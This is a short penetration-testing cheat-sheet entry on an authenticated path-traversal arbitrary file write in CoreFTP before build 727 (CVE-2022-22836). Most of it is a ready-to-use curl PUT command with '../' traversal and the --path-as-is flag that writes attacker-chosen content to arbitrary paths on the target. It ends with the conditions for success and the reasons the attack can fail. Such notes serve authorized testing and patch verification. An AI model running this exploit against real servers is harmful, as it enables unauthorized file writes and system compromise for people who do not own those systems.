## Authenticated Path Traversal and Arbitrary File Write

Identifying a CoreFTP instance prior to **build 727** where **authenticated** access is available and the service incorrectly processes **HTTP PUT** requests instead of the standard POST upload.

Execute a raw **HTTP PUT** request with directory traversal characters to write files outside of the authorized service folder.

```
curl -k -X PUT -H "Host: <TARGET_IP>" --basic -u <USERNAME>:<PASSWORD> --data-binary "<FILE_CONTENT>" --path-as-is https://<TARGET_IP>/../../../../../../<FILE_PATH>
```

- **HTTP PUT** method enabled for file uploads.
    
- Service misinterprets user input, allowing breakout from restricted directories.
    
- **Build 727 or later** patches **CVE-2022-22836**, preventing the traversal.
    
- **Missing --path-as-is flag** causes cURL to collapse the traversal path before the request reaches the target.
    
- **Authentication failure** prevents the service from processing the file write.